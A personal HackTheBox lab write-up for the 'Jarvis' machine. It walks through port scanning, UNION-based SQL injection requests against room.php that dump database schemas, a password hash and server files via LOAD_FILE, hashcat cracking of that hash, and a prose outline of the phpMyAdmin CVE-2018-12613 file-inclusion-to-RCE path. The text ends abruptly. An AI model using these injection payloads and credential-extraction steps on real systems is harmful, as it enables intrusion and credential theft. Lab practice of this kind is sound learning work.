---
pubDatetime: 2025-01-01T00:00:00Z
title: HackTheBox - Jarvis
slug: "hackethebox_machine_jarvis"
featured: false
tags:
  - hackthebox
  - machine
  - sql_injection
description: "Writeup of the machine in HackTheBox"
---
![Introduce Image](image.png)

## Introduction
This is the first writeup I've ever done about a machine on HackTheBox, and it also marks the beginning of my journey into learning Pentesting. Everything is still very new to me, so in each post, I'll be talking notes on a lot of the things I learn along the way. If there are any mistakes, I hope you'll understand and forgive me!
## Enumeration
### Nmap
Nmap - Scanning the full port range
```bash
$ nmap -p- --min-rate 10000 -oA nmap/alltcp 10.129.229.137
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 21:39 +0700
Nmap scan report for 10.129.229.137
Host is up (0.44s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
64999/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 10.61 seconds
```
Detailed Scan
```bash
$ nmap -p 22,80,64999 -sC -sV -oA nmap/jarvis 10.129.229.137
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 21:40 +0700
Nmap scan report for 10.129.229.137
Host is up (0.23s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Stark Hotel
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.59 seconds
```
### Website - TCP 64999
It only prints one line
```
Hey you have been banned for 90 seconds, don't be bad 
```
### Website - TCP 80
This is what the website looks like
![alt text](website_interface.png)
### Tech Stack
The site's response headers reveal that it uses **IronWAF**. I did a quick Google search for IronWAF, but couldn't find much useful information.
```bash
HTTP/1.1 200 OK
Date: Thu, 13 Aug 2026 17:03:51 GMT
Server: Apache/2.4.25 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
IronWAF: 2.0.3
Content-Length: 23628
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```
### Gobuster
```bash
$ gobuster dir -u http://10.129.229.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.229.137
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
images               (Status: 301) [Size: 317] [--> http://10.129.229.137/images/]
index.php            (Status: 200) [Size: 23628]
nav.php              (Status: 200) [Size: 1333]
footer.php           (Status: 200) [Size: 2237]
css                  (Status: 301) [Size: 314] [--> http://10.129.229.137/css/]
js                   (Status: 301) [Size: 313] [--> http://10.129.229.137/js/]
fonts                (Status: 301) [Size: 316] [--> http://10.129.229.137/fonts/]
phpmyadmin           (Status: 301) [Size: 321] [--> http://10.129.229.137/phpmyadmin/]
connection.php       (Status: 200) [Size: 0]
room.php             (Status: 302) [Size: 3024] [--> index.php]
sass                 (Status: 301) [Size: 315] [--> http://10.129.229.137/sass/]
server-status        (Status: 403) [Size: 279]
Progress: 441116 / 441116 (100.00%)
===============================================================
Finished
===============================================================
```
## Shell as www-data
### SQL Injection
I discovered an endpoint at `room.php` with a parameter called `cod`. It appears to be vulnerable to SQL Injection with the test payload I used being `cod='`.
![alt text](discovered_vuln.png)
My target takes user and pass to authenticate at `/phpAdmin`.
![alt text](login_phpmyadmin.png)
I worked through the process of determining the number of columns using `union select`.[^union_select]. It turned out to be 7.
[^union_select]: UNION SELECT requires the appended query to return the same number of columns as the original query. In addition, the corresponding columns must have compatible data types.


![alt text](union_select.png)
Leaking information about databases: I query the `INFORMATION_SCHEMA.SCHEMATA` table to retrieve information about the databases available to the current MYSQL user. The `SCHEMA_NAME` column contains the name of each schema. I then use `GROUP_CONCAT()`[^GROUP_CONCAT] function to print single string. [Document MySQL](https://dev.mysql.com/doc/refman/8.4/en/information-schema-schemata-table.html) and [Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
[^GROUP_CONCAT]: GROUP_CONCAT() function to concatenate multiple values into a single string. [Link here](https://www.geeksforgeeks.org/sql/mysql-group_concat-function/)


![alt text](req_1.png)
Output
```
hotel:
,information_schema:
,mysql:
,performance_schema:
```
Retrieving Information about hotel table.
```
Query:
GET /room.php?cod=100+UNION+SELECT+1,2,(SELECT+group_concat(TABLE_NAME,+":",+COLUMN_NAME,+"\r\n")+FROM+information_schema.COLUMNS+WHERE+TABLE_SCHEMA+=+'hotel'),4,5,6,7;--+- HTTP/1.1
Result:
room:cod
,room:name
,room:price
,room:descrip
,room:star
,room:image
,room:mini
```
Retrieving Information about MySQL table.
```
Query:
GET /room.php?cod=100+UNION+SELECT+1,2,(SELECT+group_concat(TABLE_NAME,+":",+COLUMN_NAME,+"\r\n")+FROM+information_schema.COLUMNS+WHERE+TABLE_SCHEMA+=+'mysql'),4,5,6,7;--+- HTTP/1.1
Result:
column_stats:db_name
,column_stats:table_name
,column_stats:column_name
,column_stats:min_value
,column_stats:max_value
,column_stats:nulls_ratio
,column_stats:avg_length
,column_stats:avg_frequency
,column_stats:hist_size
,column_stats:hist_type
,column_stats:histogram
,columns_priv:Host
,columns_priv:Db
,columns_priv:User
,columns_priv:Table_name
,columns_priv:Column_name
,columns_priv:Timestamp
,columns_priv:Column_priv
,db:Host
,db:Db
,db:User
,db:Select_priv
,db:Insert_priv
,db:Update_priv
,db:Delete_priv
,db:Create_priv
,db:Drop_priv
,db:Grant_priv
,db:References_priv
,db:Index_priv
,db:Alter_priv
,db:Create_tmp_table_priv
,db:Lock_tables_priv
,db:Create_view_priv
,db:Show_view_priv
,db:Create_routine_priv
,db:Alter_routine_priv
,db:Execute_priv
,db:Event_priv
,db:Trigger_priv
,event:db
,event:name
,event:body
,event:definer
,event:execute_at
,event:interval_value
,event:interval_field
,event:created
,event:modified
,event:last_executed
,event:starts
,e
```
Retrieving Information about User MySQL.
```
Query:
GET /room.php?cod=100+UNION+SELECT+1,2,(SELECT+group_concat(host,+":",+user,+":",+password,\r\n")+FROM+mysql.user),4,5,6,7;--+- HTTP/1.1
Result:
localhost:DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
```
### Way 1: Leaking user and password via Hashcat
Save it to a file and check its length to determine which Hashmode it is compatible with. Use the `-n` option to prevent the string from being appended with `\n`.
```bash
$ echo -n '2D2B7A5E4E637B8FBA1D17F40318F277D29964D0' > jarvis.hashes
$ wc -c jarvis.hashes
40 jarvis.hashes
```
Now, let's find which Hashcat hashmode has a length similar to the hash we need to crack.
```bash
$ ./hashcat --example-hashes | grep -i mysql -B1 -A2
Hash mode #200
  Name................: MySQL323
  Category............: Database Server
  Slow.Hash...........: No
--
Hash mode #300
  Name................: MySQL4.1/MySQL5
  Category............: Database Server
  Slow.Hash...........: No
--
Hash mode #7401
  Name................: MySQL $A$ (sha256crypt)
  Category............: Database Server
  Slow.Hash...........: Yes
--
  Usage.Notice........: use this SQL query to extract the hashes:
SELECT user, CONCAT('$mysql', SUBSTR(authentication_string,1,3), LPAD(CONV(SUBSTR(authentication_string,4,3),16,10),4,0),'*',INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) AS hash FROM user WHERE plugin = 'caching_sha2_password' AND authentication_string NOT LIKE '%INVALIDSALTANDPASSWORD%';
  Advice.Notice.......: N/A
  Password.Type.......: plain
--
  Example.Hash.Format.: plain
  Example.Hash........: $mysql$A$005*F9CC98CE08892924F50A213B6BC571A2C11778C5*625479393559393965414D45316477456B484F41316E64484742577A2E3162785353526B7554584647562F
  Example.Pass........: hashcat
  Benchmark.Mask......: ?a?a?a?a?a?a?a
--
Hash mode #11200
  Name................: MySQL CRAM (SHA1)
  Category............: Database Server
  Slow.Hash...........: No
--
  Example.Hash.Format.: plain
  Example.Hash........: $mysqlna$2576670568531371763643101056213751754328*5e4be686a3149a12847caa9898247dcc05739601
  Example.Pass........: hashcat
  Benchmark.Mask......: ?a?a?a?a?a?a?a
```
There is a slight issue here: some hash modes do not have an **Example.Hash**, so I had to search the web to verify them. See the [example_hash_wiki](https://hashcat.net/wiki/doku.php?id=example_hashes). It turns out that mode 300 has a length matching the hash I need to crack.
![alt text](hash_example.png)
Hashcat was then able to crack the hash and recover the password: `imissyou`.
```bash
$ hashcat -m 300 jarvis.hashes /usr/share/wordlists/passwords/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 ) - Platform #1 [Intel(R) Corporation]
=============================================================
* Device #01: Intel(R) Graphics [0x9a60], 3563/7127 MB (512 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 650 MB (6770 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/passwords/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

2d2b7a5e4e637b8fba1d17f40318f277d29964d0:imissyou

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 300 (MySQL4.1/MySQL5)
Hash.Target......: 2d2b7a5e4e637b8fba1d17f40318f277d29964d0
Time.Started.....: Fri Aug 14 09:51:58 2026 (0 secs)
Time.Estimated...: Fri Aug 14 09:51:58 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/passwords/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........: 12459.4 kH/s (12.38ms) @ Accel:889 Loops:1 Thr:63 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 448056/14344385 (3.12%)
Rejected.........: 0/448056 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> 18052534
Hardware.Mon.#01.: N/A

Started: Fri Aug 14 09:51:52 2026
Stopped: Fri Aug 14 09:51:59 2026
```
### Way 2: Leaking via SQL Injection (LOAD_FILE)
Based on the Nmap results: `80/tcp open http Apache httpd 2.4.25 ((Debian))` we can determine that the web server is running **Apache 2.4.25 on Debian**. The default Virtual Host configuration is located at: `/etc/apache2/sites-enabled/000-default.conf`. This file contains the **DocumentRoot** directive, which specifies the directory containning the web application's source code. From there, we can access and read the application's source code from the corresponding directory.
```
Query: 
GET /room.php?cod=100+UNION+SELECT+1,2,(LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf')),4,5,6,7;--+- HTTP/1.1
Output:
# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	#ServerName www.example.com

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
	DirectoryIndex index.php
	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf
```
I leaked the source code of `index.php` to take a look and discovered an interesting piece of code:
```php
<?php

              error_reporting(0);

              include("connection.php");

              include("roomobj.php");

              $result=$connection->query("select * from room");

              while($line=mysqli_fetch_array($result)){

                $room=new Room();

                $room->cod=$line['cod'];

                $room->name=$line['name'];

                $room->price=$line['price'];

                $room->star=$line['star'];

                $room->image=$line['image'];

                $room->mini=$line['mini'];

  

                $room->printRoom();

                }

              ?>
```
After that, I read the `connection.php` source code and obtained the username and password.
```
Query:
GET /room.php?cod=100+UNION+SELECT+1,2,(LOAD_FILE('/var/www/html/connection.php')),4,5,6,7;--+- HTTP/1.1
Output:
<?php
$connection=new mysqli('127.0.0.1','DBadmin','imissyou','hotel');
?>
```
### Way 1: Getshell via CVE 2018-12613
[CVE-2018-12613](https://medium.com/@happyholic1203/phpmyadmin-4-8-0-4-8-1-remote-code-execution-257bcc146f8e) is a Local File Inclusion vulnerability in **phpMyAdmin 4.8.0–4.8.1**, caused by an inconsistency between the path being validated and the path actually being included.

Specifically, index.php calls the `Core::checkPageValidity()` function to validate the target parameter before including it. The function works by stripping everything after the `?` character and then checking the remaining part against a whitelist. However, after the check passes, index.php includes the entire original string without stripping it, creating an opportunity for exploitation.

An attacker can exploit this flaw to read arbitrary files on the server through path traversal. Furthermore, the LFI can be escalated to **Remote Code Execution (RCE)** by executing an SQL query containing a PHP payload in phpMyAdmin and then including the session file containing that payload, causing the code to be executed on the server.




## Reference
[1] https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html


[2] 
